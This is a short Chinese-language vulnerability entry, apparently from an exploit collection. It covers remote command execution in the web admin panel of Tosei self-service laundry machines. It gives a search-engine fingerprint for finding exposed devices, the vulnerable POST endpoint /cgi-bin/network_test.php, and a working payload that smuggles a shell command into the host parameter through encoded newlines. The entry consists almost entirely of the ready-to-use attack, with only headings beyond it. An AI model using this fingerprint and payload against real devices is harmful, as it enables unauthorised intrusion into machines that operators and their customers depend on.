# Tosei自助洗衣机web管理端network_test.php文件host参数远程命令执行漏洞

- **系统**：Tosei　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`web.body="tosei_login_check.php"`
- **请求**：`POST /cgi-bin/network_test.php HTTP/1.1`

**请求体 / payload**
```
访问poc出现如下页面表示可能存在漏洞
/cgi-bin/network_test.php

修改host参数为想要执行的命令
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
host=%0aid%0a&command=ping
```

**其他**
- Tosei 自助洗衣机 web 管理端 network\_test.php 文件 host 参数远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Tosei 自助洗衣机 web 管理端